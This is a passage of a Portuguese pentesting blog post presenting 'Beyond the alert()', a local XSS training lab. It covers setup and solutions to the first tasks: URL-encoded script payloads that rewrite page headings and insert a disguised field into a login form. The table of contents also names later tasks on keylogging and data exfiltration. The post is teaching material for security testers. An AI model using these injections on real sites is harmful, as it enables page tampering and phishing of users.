<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Beyond the alert()" /><meta name="author" content="H41stur" /><meta property="og:locale" content="en" /><meta name="description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><meta property="og:description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><link rel="canonical" href="https://h41stur.github.io/posts/beyond-the-alert/" /><meta property="og:url" content="https://h41stur.github.io/posts/beyond-the-alert/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/posts/beyond_the_alert.jpeg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-06-24T01:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/posts/beyond_the_alert.jpeg" /><meta property="twitter:title" content="Beyond the alert()" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@H41stur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H41stur"},"dateModified":"2023-06-26T11:29:46-03:00","datePublished":"2023-06-24T01:00:00-03:00","description":"“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”","headline":"Beyond the alert()","image":"https://h41stur.github.io/img/posts/beyond_the_alert.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/beyond-the-alert/"},"url":"https://h41stur.github.io/posts/beyond-the-alert/"}</script><title>Beyond the alert() | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Beyond the alert()</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Beyond the alert()</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> H41stur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Jun 24, 2023, 1:00 AM -0300" >Jun 24, 2023<i class="unloaded">2023-06-24T01:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Jun 26, 2023, 11:29 AM -0300" >Jun 26, 2023<i class="unloaded">2023-06-26T11:29:46-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="8691 words">48 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/img/posts/beyond_the_alert.jpeg" alt="bta" /></p><ul><li><a href="#introdução">Introdução</a><li><a href="#objetivo">Objetivo</a><li><a href="#obtendo-o-projeto">Obtendo o Projeto</a><li><a href="#resolução-das-tasks">Resolução das Tasks</a><ul><li><a href="#task-1---modify-html-elements"><em>Task 1 - Modify HTML Elements</em></a><li><a href="#task-2---manipulating-forms"><em>Task 2 - Manipulating Forms</em></a><li><a href="#task-3---intercept-form-submit"><em>Task 3 - Intercept Form Submit</em></a><li><a href="#task-4---stealing-form-submissions"><em>Task 4 - Stealing Form Submissions</em></a><li><a href="#task-5---redirecting-all-links-in-the-page"><em>Task 5 - Redirecting All Links in the Page</em></a><li><a href="#task-6---changing-content-to-social-engineering"><em>Task 6 - Changing Content to Social Engineering</em></a><li><a href="#task-7---abusing-event-listeners"><em>Task 7 - Abusing Event Listeners</em></a><li><a href="#task-8---redirect-on-click"><em>Task 8 - Redirect on Click</em></a><li><a href="#task-9---javascript-keylogger"><em>Task 9 - JavaScript Keylogger</em></a><li><a href="#task-10---invoking-external-js"><em>Task 10 - Invoking External JS</em></a><li><a href="#task-11---invoking-external-js-using-js"><em>Task 11 - Invoking External JS Using JS</em></a><li><a href="#task-12---stealing-information-from-auto-complete-fields"><em>Task 12 - Stealing Information from Auto-Complete Fields</em></a><li><a href="#task-13---stealing-information-from-auto-complete-fields-with-xmlhttprequest"><em>Task 13 - Stealing Information from Auto-Complete Fields with XMLHttpRequest</em></a><li><a href="#task-14---data-exfiltration-with-xmlhttprequest-get"><em>Task 14 - Data Exfiltration with XMLHttpRequest GET</em></a><li><a href="#task-15---data-exfiltration-with-xmlhttprequest-post"><em>Task 15 - Data Exfiltration with XMLHttpRequest POST</em></a><li><a href="#task-16---getting-parameters-from-url"><em>Task 16 - Getting Parameters from URL</em></a><li><a href="#task-17---stealing-csrf-tokens"><em>Task 17 - Stealing CSRF Tokens</em></a><li><a href="#task-18---html-parsing-of-xmlhttprequest"><em>Task 18 - HTML Parsing of XMLHttpRequest</em></a><li><a href="#task-19---html-parsing-multi-level"><em>Task 19 - HTML Parsing Multi-Level</em></a><li><a href="#task-20---json-parsing-multi-level"><em>Task 20 - JSON Parsing Multi-Level</em></a><li><a href="#task-21---xml-parsing-multi-level"><em>Task 21 - XML Parsing Multi-Level</em></a></ul><li><a href="#conclusão">Conclusão</a></ul><h2 id="introdução">Introdução</h2><p>Ao longo do tempo em que faço parte da comunidade de cibersegurança, tive e tenho contato com vários profissionais que, falando exclusivamente do <strong>ponto de vista técnico</strong>, são excepcionais, outros muito bons e outros nem tanto.</p><p>Faço questão de frisar o termo “<span style="color: #1cce43"><b>ponto de vista técnico</b></span>”, pois este conhecimento, por mais que seja determinante, ainda não é suficiente para moldar um bom profissional. Também não vou entrar em assuntos generalizados de <em>soft skills</em>, pois isso se tornaria um papo para outras ocasiões.</p><p>O lugar onde quero chegar é: na dificuldade que vejo com frequência de um cara bom, saber comunicar o impacto dos <em>findings</em> em um projeto de cibersegurança ao ponto que seu trabalho seja <strong>compreendido</strong> e reconhecido pelo <strong>cliente</strong> (sim, quem tem que compreender o risco de uma vulnerabilidade é o <strong>cliente</strong>, não os outros coleguinhas da área), em outras palavras, saber <em>hackear</em> não significa absolutamente nada na área de segurança, <strong>SE</strong> você não souber demonstrar o impacto do seu <em>hacking</em>.</p><p>Exemplificando isso tudo aí de cima, vamos supor que o cara encontrou um <strong>XSS</strong> em um ponto crítico de uma aplicação, e é capaz de exfiltrar diversos dados sensíveis, aí na <strong>prova de conceito</strong> apresentada pro cliente, a única imagem apresentada é aquele famoso <code class="language-plaintext highlighter-rouge">alert(1)</code>.</p><p>Ok, o <code class="language-plaintext highlighter-rouge">alert(1)</code> prova que existe um XSS ali, mas o seu cliente não sabe, e muitas vezes nem tem a obrigação de saber que a execução de uma carga JavaScript no navegador da vítima pode levar a uma infinidade de coisas das mais diversas criticidades. <span style="color: #1cce43">Pra ele seu ataque resultou em abrir um “<i>pop-up</i>” no navegador</span>.</p><p>Por outro lado, temos outro viés, onde o cara encontra um XSS, porém não consegue exfiltrar um <em>cookie</em>, por exemplo, seja por um <em>hardening</em> nos <em>headers</em> da aplicação, ou qualquer outro motivo, e por conta disso, não tem a “<strong>malicia</strong>” de montar um ataque mais elaborado. Com isso, ele acaba categorizando este <em>finding</em> com severidade <strong>baixa</strong> justamente por não saber ou ter a criatividade de montar ataques mais complexos com JavaScript para causar mais impacto, pois em todo seu aprendizado, nunca acabou saindo do <code class="language-plaintext highlighter-rouge">alert(1)</code>.</p><p>Sabendo que eu <strong>não</strong> sou um dos caras excepcionais, mas também não sou dos piores (espero eu), vou deixar meus 10 centavos aqui. Com base em alguns treinamentos que já fiz, e outros ataques que já realizei (profissionalmente), decidi criar um material com a intenção de abrir o leque no que diz respeito a ataques baseados em JavaScript.</p><p>Se tratam de <strong>21 “<em>tasks</em>“</strong> baseadas em ataques XSS que evoluem sua complexidade gradativamente. Nada que seja muito complexo no final, afinal a intenção não é ensinar JavaScript, mas sim a “maldade” em causar impacto neste tipo de ataque.</p><p><img data-proofer-ignore data-src="/img/posts/itachi.gif" alt="Itachi" width="250" /></p><p>O projeto se chama <code class="language-plaintext highlighter-rouge">Beyond the alert()</code> e foi todo conteinerizado para facilitar a portabilidade e está disponível em <a href="https://github.com/h41stur/beyond_the_alert" target="\_blank">https://github.com/h41stur/beyond_the_alert </a>.</p><h2 id="objetivo">Objetivo</h2><p>Bom, vamos começar com o que não é o objetivo deste projeto:</p><ul><li>Como comentado acima, o objetivo aqui <span style="color: #1cce43"><b>não é ensinar</b></span> JavaScript, ainda mais porque saber esta linguagem ao menos no ponto de entender um <em>script</em>, faz parte do básico pra quem é da área.<li>O objetivo <span style="color: #1cce43"><b>não é mostrar como encontrar um XSS</b></span>, ainda mais porque cada caso é um caso e para facilitar tudo aqui, o ponto de injeção é bem explícito.<li>O objetivo <span style="color: #1cce43"><b>não é mostrar qualquer tipo de <i>bypass</i></b></span>, <em>bypass</em> é uma ciência completa, e não existe uma forma de ensinar, justamente porque não existe a forma certa.</ul><p>Com isso em mente, podemos dizer claramente que o objetivo do projeto <span style="color: #1cce43">Beyond the alert()</span> é exclusivamente expandir os horizontes de ataque, quando uma situação de XSS é encontrada. Tendo em vista dois pontos principais:</p><ol><li>Saber demonstrar o impacto de um XSS encontrado;<li>Encontrar formas criativas de ataques que possam elevar o nível de criticidade de um XSS encontrado.</ol><h2 id="obtendo-o-projeto">Obtendo o Projeto</h2><p>O projeto está disponível em meu GitHub no endereço <a href="https://github.com/h41stur/beyond_the_alert" target="\_blank">https://github.com/h41stur/beyond_the_alert </a>. O Beyond the alert() utiliza como base o contêiner <code class="language-plaintext highlighter-rouge">php:7.4-apache</code> e todo o código-fonte das tasks é baseado em HTML e PHP.</p><p>Para obter a cópia do projeto, clone o repositório.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>git clone https://github.com/h41stur/beyond_the_alert.git <span class="o">&amp;&amp;</span> <span class="nb">cd </span>beyond_the_alert
</pre></table></code></div></div><p>Para “<em>buildar</em>” o contêiner:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>docker build <span class="nt">-t</span> bta <span class="nb">.</span>
</pre></table></code></div></div><p>Para executar o contêiner, eu sugiro utilizar a flag <code class="language-plaintext highlighter-rouge">--rm</code> para autodestruí-lo após sua parada, evitando comprometimento desnecessário de memória.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>docker run <span class="nt">--rm</span> <span class="nt">-p</span> 80:80 bta
</pre></table></code></div></div><p>Após sua execução, ao visitar seu <em>localhost</em> no navegador, seu menu principal estará disponível.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert.png" alt="Menu" /></p><h2 id="resolução-das-tasks">Resolução das <em>Tasks</em></h2><p>Como parte do projeto, deixarei a resolução das <em>tasks</em>, ou pelo menos uma das formas de se resolver cada uma das <em>tasks</em>, uma vez que, ao ter disponível uma linguagem de programação tão abrangente quanto JS, temos várias formas de fazer o mesmo.</p><p>Para cada uma das resoluções, tentarei deixar um breve descritivo e algumas referências.</p><blockquote><p><span style="color: #1cce43"><b>IMPORTANTE</b></span></p><p>Todas as <em>tasks</em> tem o mesmo ponto de injeção de XSS, o parâmetro GET <code class="language-plaintext highlighter-rouge">search=</code>.</p></blockquote><h3 id="task-1---modify-html-elements"><em>Task 1 - Modify HTML Elements</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-1.png" alt="Task 1" /></p><h4 id="objetivo-1">Objetivo</h4><p>O objetivo desta <em>task</em> é modificar o conteúdo dos campos da página, utilizando somente JavaScript injetado em um vetor vulnerável a XSS refletido.</p><h4 id="conhecimento-base">Conhecimento Base</h4><p>O HTML (<em>HyperText Markup Language</em>) especificado na <a href="https://www.ietf.org/rfc/rfc1866.txt">RFC1866</a>, é a linguagem padrão para a criação de páginas e aplicações web. Ela é usada para estruturar o conteúdo na web de forma que os navegadores possam interpretá-lo e exibi-lo aos usuários.</p><p>O HTML usa “<em>tags</em>” para marcar diferentes tipos de conteúdo. Cada tag HTML tem uma função específica e ajuda a descrever o tipo de conteúdo que ela contém.</p><p>Já o JavaScript é uma linguagem de programação interpretada que é usada principalmente em páginas da web para adicionar funcionalidades interativas que não podem ser alcançadas apenas com HTML e CSS.</p><p>Unindo as informações, é possível interagir, modificar, incluir ou excluir qualquer elemento estático do HTML de forma dinâmica com JavaScript.</p><p>Existem métodos específicos para identificar e interagir com elementos HTML, alguns deles são:</p><ul><li><code class="language-plaintext highlighter-rouge">getElementById()</code><li><code class="language-plaintext highlighter-rouge">getElementsByClassName()</code><li><code class="language-plaintext highlighter-rouge">getElementsByName()</code><li><code class="language-plaintext highlighter-rouge">getElementsByTagName()</code><li><code class="language-plaintext highlighter-rouge">getElementsByTagNameNS()</code></ul><p>Cada elemento HTML também possui diversas <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element">propriedades</a>.</p><h4 id="exploração">Exploração</h4><p>Primeiramente é preciso ativar o vetor de injeção, nesta <em>task</em>, basta pesquisar qualquer coisa no campo de busca, ou inserir qualquer valor no parâmetro GET <code class="language-plaintext highlighter-rouge">search</code>.</p><ul><li><a href="http://localhost/01/?search=test">http://localhost/01/?search=test</a></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-2.png" alt="Valor refletido" /></p><p>Consultando o HTML da página, podemos obter o contexto onde o código malicioso atuará.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-3.png" alt="Contexto" /></p><p>Sabemos que, entre as diversas formas de identificar um campo dentro do HTML, nem sempre todas serão possíveis. Como estes campos não tem um ID nem um nome para identificá-los, não podemos utilizar <code class="language-plaintext highlighter-rouge">getElementById()</code> nem <code class="language-plaintext highlighter-rouge">getElementsByName()</code>. Porém, podemos identificá-los pela classe ou pela própria <em>tag</em>.</p><p>Porém, nomes de <em>tags</em> e <em>classes</em> não são únicos em um HTML, portanto, ao capturar estes elementos, o JavaScript irá montar um <em>array</em> com estes elementos, dos quais precisamos indicar qual posição dentro deste <em>array</em> contém o campo que precisamos.</p><p>Por exemplo:</p><div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">document</span><span class="p">.</span><span class="nf">getElementByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">h2</span><span class="dl">"</span><span class="p">)</span>
</pre></table></code></div></div><p>Este objeto irá conter todos os campos cuja <em>tag</em> é um <code class="language-plaintext highlighter-rouge">&lt;h2&gt;</code>. Se quisermos, por exemplo, o primeiro <code class="language-plaintext highlighter-rouge">&lt;h2&gt;</code>, faremos da seguinte forma:</p><div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">document</span><span class="p">.</span><span class="nf">getElementByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">h2</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</pre></table></code></div></div><p>E se quisermos o terceiro:</p><div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">document</span><span class="p">.</span><span class="nf">getElementByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">h2</span><span class="dl">"</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
</pre></table></code></div></div><p>Ao termos o objeto correspondente ao elemento que precisamos, podemos utilizar a <strong>propriedade</strong> <code class="language-plaintext highlighter-rouge">innerHTML</code> que obtém ou define o conteúdo HTML de um elemento.</p><p>O script ficaria da seguinte forma:</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">h1</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Modificado!</span><span class="dl">"</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">h2</span><span class="dl">"</span><span class="p">)[</span><span class="mi">2</span><span class="p">].</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Modificado Também!</span><span class="dl">"</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Ao converter para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E">http://localhost/01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E</a></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-4.png" alt="Resultado" /></p><h4 id="referências">Referências</h4><ul><li><a href="https://www.ietf.org/rfc/rfc1866.txt">https://www.ietf.org/rfc/rfc1866.txt</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById">https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName">https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByName">https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByName</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName">https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagNameNS">https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagNameNS</a><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Element">https://developer.mozilla.org/en-US/docs/Web/API/Element</a></ul><h3 id="task-2---manipulating-forms"><em>Task 2 - Manipulating Forms</em></h3><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-5.png" alt="Task 2" /></p><h4 id="objetivo-2">Objetivo</h4><p>O objetivo desta <em>task</em> é modificar o formulário de autenticação inserindo um novo campo <em>“Registration Number”</em>. É importante que este campo seja homogêneo com todo o formulário, para parecer de fato parte deste.</p><h4 id="conhecimento-base-1">Conhecimento Base</h4><p>O JavaScript nos permite não só manipular elementos HTML, como também criá-los e inseri-los no corpo da página em qualquer lugar, desde que exista uma referência de posicionamento.</p><p>Para criar um objeto que contenha um novo elemento, existe o método <code class="language-plaintext highlighter-rouge">createElement()</code>. Já para inseri-lo na página de acordo com uma referência existente, existe o método <code class="language-plaintext highlighter-rouge">insertBefore()</code>.</p><h4 id="exploração-1">Exploração</h4><p>Para objetos do tipo <em>form</em> o JavaScript já possui o método <code class="language-plaintext highlighter-rouge">forms</code> que identifica cada formulário dentro do documento, e cria um <em>array</em> com todos (mesmo que só exista um). Portanto, para identificar o primeiro formulário em uma página, podemos fazer da seguinte forma:</p><div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</pre></table></code></div></div><p>Já para identificar os elementos em um formulário, podemos utilizar o método <code class="language-plaintext highlighter-rouge">elements</code> que também cria um <em>array</em> com todos os elementos do formulário. Portanto, para identificar o primeiro elemento de um formulário, podemos fazer da seguinte forma:</p><div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</pre></table></code></div></div><p>Neste caso, para criarmos e inserirmos um novo campo, podemos criar dois objetos, um contendo o novo campo, e outro contendo o campo de referência utilizado para o posicionamento, e logo em seguida invocar o método <code class="language-plaintext highlighter-rouge">insertBefore()</code>.</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">input</span><span class="dl">"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">prev</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">elements</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">insertBefore</span><span class="p">(</span><span class="nx">input</span><span class="p">,</span> <span class="nx">prev</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Convertendo para <em>URL Encode</em>:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E
</pre></table></code></div></div><p>Gerando a seguinte URL:</p><ul><li><a href="http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E">http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E</a></ul><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-7.png" alt="Form" /></p><p>O campo foi inserido, porém, <span style="color: #1cce43">TEMOS UM PROBLEMA!</span></p><p>O novo campo ficou totalmente desconfigurado, nitidamente um alien dentro do formulário.</p><p>Isto aconteceu, pois criamos um novo campo, porém não inserimos nenhum atributo, como classes CSS, ou <em>placeholder</em> para torná-lo natural. Podemos fazer isto com o método <code class="language-plaintext highlighter-rouge">setAttribute()</code>.</p><p>Quando olhamos para o código HTML, podemos ver que os campos <em>input</em> do formulário, estão formatados com a classe CSS <code class="language-plaintext highlighter-rouge">input-block-level</code>.</p><p><img data-proofer-ignore data-src="/img/posts/2023-06-21-beyond-the-alert-9.png" alt="Classes" /></p><p>O código final, fica desta forma:</p><div lang="html" class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
	<span class="kd">var</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">input</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">input</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text</span><span class="dl">"</span><span class="p">);</span>
